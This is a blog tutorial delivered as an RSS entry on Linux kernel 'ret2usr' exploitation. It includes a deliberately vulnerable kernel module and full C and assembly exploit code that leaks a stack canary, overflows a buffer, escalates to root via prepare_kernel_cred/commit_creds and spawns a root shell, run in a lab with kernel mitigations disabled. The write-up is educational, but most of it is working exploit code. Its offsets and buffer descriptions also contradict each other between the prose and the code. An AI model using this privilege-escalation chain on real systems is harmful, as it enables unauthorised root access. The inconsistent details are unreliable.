<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Anvbis</title><link>https://anvbis.github.io/</link><description>Recent content on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Tue, 25 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel 0x01 :: Return to User-space</title><link>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</guid><description>Table of Contents User-space vs. Kernel-space Return to User-space Overview Saving the Initial State Restoring the Initial State Escalating Privileges in the Kernel A Vulnerable Kernel Module Exploiting the Kernel Module Environment Setup Building the Exploit User-space vs. Kernel-space Kernel-space is where the kernel runs and provides its services (i.e. where kernel code and kerenl modules run), whereas user-space is where user processes are executed. User-space code runs in it&amp;rsquo;s own carefully segregated piece of memory, where kernel-space code has access to the entirety of system memory.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/a>&lt;/li>
&lt;li>&lt;a href="#return-to-user-space-overview">Return to User-space Overview&lt;/a>&lt;/li>
&lt;li>&lt;a href="#saving-the-initial-state">Saving the Initial State&lt;/a>&lt;/li>
&lt;li>&lt;a href="#restoring-the-initial-state">Restoring the Initial State&lt;/a>&lt;/li>
&lt;li>&lt;a href="#escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/a>&lt;/li>
&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#exploiting-the-kernel-module">Exploiting the Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/h2>
&lt;p>Kernel-space is where the kernel runs and provides its services (i.e. where kernel code and kerenl modules run), whereas user-space is where user processes are executed. User-space code runs in it&amp;rsquo;s own carefully segregated piece of memory, where kernel-space code has access to the entirety of system memory.&lt;/p>
&lt;p>Within kernel-space all physical memory is available (to some degree, depending on which kernel exploit mitigations are enabled). What this means, is that we are able to read and potentially execute code loaded in user-space.&lt;/p>
&lt;p>It is important to note, however, that most kernel exploit mitigations attempt to separate user-space from kernel-space, preventing us from executing any code loaded in user-space.&lt;/p>
&lt;h2 id="return-to-user-space-overview">Return to User-space Overview&lt;/h2>
&lt;p>The &lt;code>ret2usr&lt;/code> exploit technique is very straight-forward. When all kernel exploit mitigations are disabled, you are able to execute user-space code inside kernel-space. This means we can write code that escalates our privileges and returns from kernel-space in order to execute arbitrary code, with the end goal of spawning a root shell.&lt;/p>
&lt;p>As a result, all we need to do within our exploit is redirect process execution to user-space code that escalates privileges, returns to user-space and pops a shell.&lt;/p>
&lt;h2 id="saving-the-initial-state">Saving the Initial State&lt;/h2>
&lt;p>Before we can begin exploitation we will need to find some way to save the current user-space state. This is done as the &lt;code>iretq&lt;/code> instruction will use the information saved below in order to return to user-space.&lt;/p>
&lt;p>We save the required registers with the assembly code below in order to build our &lt;code>iret&lt;/code> frame to later exit kernel-space.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> save_ss, save_sp, save_rf, save_cs;
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">save_user_space&lt;/span>()
{
&lt;span style="color:#75715e">/* save user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_ss, ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_sp, rsp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pushf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pop save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_cs, cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="restoring-the-initial-state">Restoring the Initial State&lt;/h2>
&lt;p>In order to restore the initial state and return to user-space we require two instructions, &lt;code>swapgs&lt;/code> and &lt;code>iretq&lt;/code>. In x86_64 systems the &lt;code>swapgs&lt;/code> instruction must be made before the &lt;code>iretq&lt;/code> instruction as it swaps the &lt;code>gs&lt;/code> register between kernel-mode and user-mode.&lt;/p>
&lt;p>We next build our &lt;code>iret&lt;/code> frame, containing the information required to return to user-space by pushing our saved user-space registers onto the top of the stack. Finally we make our &lt;code>iretq&lt;/code> instruction to return from kernel-space.&lt;/p>
&lt;p>Note: At the very top of our &lt;code>iret&lt;/code> frame we put the address we want to return to.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">load_user_space&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> target)
{
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;swapgs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_sp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, %[rip];&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;iretq;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
&lt;span style="color:#f92672">:&lt;/span> [rip] &lt;span style="color:#e6db74">&amp;#34;=&amp;amp;r&amp;#34;&lt;/span> (target)
);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/h2>
&lt;p>Escalating privileges inside kernel-space is done via two function calls, &lt;code>prepare_kernel_cred&lt;/code> and &lt;code>commit_creds&lt;/code>.&lt;/p>
&lt;p>The &lt;code>prepare_kernel_cred&lt;/code> function call creates a credentials struct for whatever uid is provided to it (this will almost always be &amp;lsquo;0&amp;rsquo;, for the root user). The &lt;code>commit_creds&lt;/code> function call takes whatever credentials struct is provided to it and applies those privileges to the current user.&lt;/p>
&lt;p>We can find the address (in kernel-space) of both these functions by reading the &lt;code>/proc/kallsyms&lt;/code> file.&lt;/p>
&lt;pre>&lt;code>/ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff810881c0 T prepare_kernel_cred
/ # cat /proc/kallsyms | grep commit_creds
ffffffff81087e80 T commit_creds
&lt;/code>&lt;/pre>&lt;p>Using the addresses we found earlier, we can write a bit of assembly that escalates our privileges to that of the root user.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">&lt;span style="color:#a6e22e">xor&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rdi&lt;/span>
&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff810881c0&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">prepare_kernel_cred&lt;/span>
&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff81087e80&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">commit_creds&lt;/span>
&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rax&lt;/span>
&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s place this inside a function so we can easily use it within our final exploit.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">escalate_privileges&lt;/span>()
{
&lt;span style="color:#75715e">/* escalate privileges */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;xor rdi, rdi;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// prepare_kernel_cred
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// commit_creds
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;mov rdi, rax;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
load_user_space(&lt;span style="color:#75715e">/* target return address */&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
&lt;p>I&amp;rsquo;ve written a vulnerable kernel module to demonstrate the exploit technique detailed above. This kernel module has buffer overflow vulnerabilities in both its &lt;code>challenge_read&lt;/code> and &lt;code>challenge_write&lt;/code> functions.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" checked />
&lt;label for="1">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
char tmp[128];
return raw_copy_to_user(buf, tmp, len);
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
char tmp[128];
return raw_copy_from_user(tmp, buf, len);
}
static int challenge_open(struct inode *inode, struct file *fp)
{
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
.release = challenge_release
};
struct proc_dir_entry *proc_entry;
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>In the code block below we can see the kernel module&amp;rsquo;s &lt;code>read&lt;/code> handler. It copies an arbitrary number of bytes from a 128 byte buffer into a globally accessible buffer &lt;code>out&lt;/code> of size 256 bytes. This means we can read 128 bytes below the small &lt;code>tmp&lt;/code> buffer.&lt;/p>
&lt;p>Perhaps we can use this to read stack values (e.g. the value of the stack canary).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#66d9ef">char&lt;/span> tmp[&lt;span style="color:#ae81ff">128&lt;/span>];
&lt;span style="color:#66d9ef">return&lt;/span> raw_copy_to_user(buf, tmp, len);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the code block below we can see the kernel module&amp;rsquo;s &lt;code>write&lt;/code> handler. It copies an arbitrary number of bytes into a 256 byte buffer &lt;code>out&lt;/code>, that are then copied into a buffer stored on the stack &lt;code>tmp&lt;/code> of size 128 bytes.&lt;/p>
&lt;p>This gives us a buffer overflow of 128 bytes that we can potentially use to control process execution.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#66d9ef">char&lt;/span> tmp[&lt;span style="color:#ae81ff">128&lt;/span>];
&lt;span style="color:#66d9ef">return&lt;/span> raw_copy_from_user(out, buf, len);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploiting-the-kernel-module">Exploiting the Kernel Module&lt;/h2>
&lt;p>First, let&amp;rsquo;s use the buffer overflow vulnerability in the kernel module&amp;rsquo;s &lt;code>read&lt;/code> function to dump a bunch of stack values. The below code reads 32 &lt;code>unsigned long&lt;/code> values (256 bytes) and prints them out.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;assert.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
{
&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> leak[&lt;span style="color:#ae81ff">32&lt;/span>];
read(fd, leak, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>);
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
printf(&lt;span style="color:#e6db74">&amp;#34;%d: 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, i, leak[i]);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the output below we can see a couple values that look like a stack canary and a return address in kernel-space. We can see these are at indexes 16 and 17.&lt;/p>
&lt;pre>&lt;code>/home/ctf # ./exploit
0: 0xffffffff81c00194
1: 0xffffffff81c001a0
2: 0xffffffff81aa85a0
3: 0xffffffff81345d8b
4: 0x4
5: 0xffff888006bf5700
6: 0x20000075a4070
7: 0xffff888006bf5710
8: 0x100020000
9: 0x0
10: 0xffff888000000000
11: 0x0
12: 0x0
13: 0x0
14: 0x0
15: 0xa73ee2eeab3d9f00
16: 0xa73ee2eeab3d9f00 &amp;lt;-- stack canary
17: 0xffff888006bcd840 &amp;lt;-- return address
...
&lt;/code>&lt;/pre>&lt;p>Now we can write a function that leaks the stack canary, so we can use it later when we want to redirect process execution. From our investigation above we can see that the stack canary is stored at index 16 (just below the &lt;code>tmp&lt;/code> buffer on the stack).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">leak_canary&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd)
{
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> leak[&lt;span style="color:#ae81ff">32&lt;/span>];
read(fd, leak, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> leak[&lt;span style="color:#ae81ff">15&lt;/span>];
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We should also write a function that overflows the buffer in the &lt;code>write&lt;/code> handler and redirect process execution to our &lt;code>escalate_privileges&lt;/code> function. We&amp;rsquo;ll also want to overwrite the stack canary so the kernel module doesn&amp;rsquo;t detect the overflow and halt execution.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
{
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> payload[&lt;span style="color:#ae81ff">18&lt;/span>];
payload[&lt;span style="color:#ae81ff">16&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> canary;
payload[&lt;span style="color:#ae81ff">17&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>)escalate_privileges;
write(fd, payload, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>In order for this technique to work, we&amp;rsquo;ll need to disable all kernel exploit mitigation features in our kernel emulator. This means removing all instances of &lt;code>+smep&lt;/code>, &lt;code>+smap&lt;/code>, &lt;code>kpti=1&lt;/code> and &lt;code>kaslr&lt;/code>, and adding the &lt;code>nokaslr&lt;/code> and &lt;code>nopti&lt;/code> flags.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="2" type="checkbox" />
&lt;label for="2">
&lt;span class="collapsable-code__language">sh&lt;/span>
&lt;span class="collapsable-code__title">launch.sh&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-sh" >&lt;code>
#!/bin/bash
# build root fs
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 &amp;gt; ../initramfs.cpio.gz
popd
# launch
/usr/bin/qemu-system-x86_64 \
-kernel linux-5.4/arch/x86/boot/bzImage \
-initrd $PWD/initramfs.cpio.gz \
-fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
-nographic \
-monitor none \
-s \
-append &amp;#34;console=ttyS0 nokaslr nopti quiet&amp;#34;
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Running the build and then the run scripts will drop us into a root shell on the kernel emulator.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ ./build.sh
...
~/pwnkernel $ ./launch.sh
/ # id
uid=0(root) gid=0
&lt;/code>&lt;/pre>&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
&lt;p>First, let&amp;rsquo;s write a simple function that will spawn a shell via the &lt;code>system&lt;/code> function. We&amp;rsquo;ll need this after we return to user-space after escalating privileges.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">shell&lt;/span>()
{
system(&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now let&amp;rsquo;s write the main logic of our exploit, it will do several things:&lt;/p>
&lt;ol>
&lt;li>Save the initial user-space state.&lt;/li>
&lt;li>Leak the stack canary with the vulnerability in the &lt;code>read&lt;/code> handler to perform a safe overflow.&lt;/li>
&lt;li>Overflow the vulnerable buffer and redirect execution to our &lt;code>escalate_privileges&lt;/code> function.&lt;/li>
&lt;li>Escalate privileges in kernel-space.&lt;/li>
&lt;li>Return to user-space and get a root shell.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
{
save_user_space();
&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;span style="color:#75715e">/* leak stack canary */&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary &lt;span style="color:#f92672">=&lt;/span> leak_canary(fd);
printf(&lt;span style="color:#e6db74">&amp;#34;[*] canary @ 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, canary);
overflow_buffer(fd, canary);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>You can find the complete exploit code below.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="3" type="checkbox" checked />
&lt;label for="3">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
unsigned long save_ss, save_sp, save_rf, save_cs;
void shell()
{
system(&amp;#34;/bin/sh&amp;#34;);
}
void save_user_space()
{
/* save user-space */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;mov save_ss, ss;&amp;#34;
&amp;#34;mov save_sp, rsp;&amp;#34;
&amp;#34;pushf;&amp;#34;
&amp;#34;pop save_rf;&amp;#34;
&amp;#34;mov save_cs, cs;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
);
}
void load_user_space(unsigned long target)
{
/* return to user-space */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;swapgs;&amp;#34;
&amp;#34;mov r15, save_ss;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_sp;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_rf;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_cs;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, %[rip];&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;iretq;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
: [rip] &amp;#34;=&amp;amp;r&amp;#34; (target)
);
}
void escalate_privileges()
{
/* escalate privileges */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;xor rdi, rdi;&amp;#34;
&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34; // prepare_kernel_cred
&amp;#34;call rbx;&amp;#34;
&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34; // commit_creds
&amp;#34;mov rdi, rax;&amp;#34;
&amp;#34;call rbx;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
);
/* return to user-space */
load_user_space((unsigned long)shell);
}
unsigned long leak_canary(int fd)
{
unsigned long leak[32];
read(fd, leak, sizeof(unsigned long) * 32);
return leak[15];
}
void overflow_buffer(int fd, unsigned long canary)
{
unsigned long payload[18];
payload[15] = canary;
payload[17] = (unsigned long)escalate_privileges;
write(fd, payload, sizeof(unsigned long) * 18);
}
int main(int argc, char **argv)
{
save_user_space();
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* leak stack canary */
unsigned long canary = leak_canary(fd);
printf(&amp;#34;[*] canary @ 0x%lx\n&amp;#34;, canary);
overflow_buffer(fd, canary);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Note that the exploit code will need to be compiled as a static executable in order to run on the kernel emulator.&lt;/p>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>After inserting the vulnerable kernel module and running our exploit we can see that our exploit leaked the stack canary and gave us a root shell.&lt;/p>
&lt;pre>&lt;code>/ # insmod challenge.ko
/ # su ctf
/ $ /home/ctf/exploit
...
/ # id
/ # uid=0(root) gid=0
&lt;/code>&lt;/pre>&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
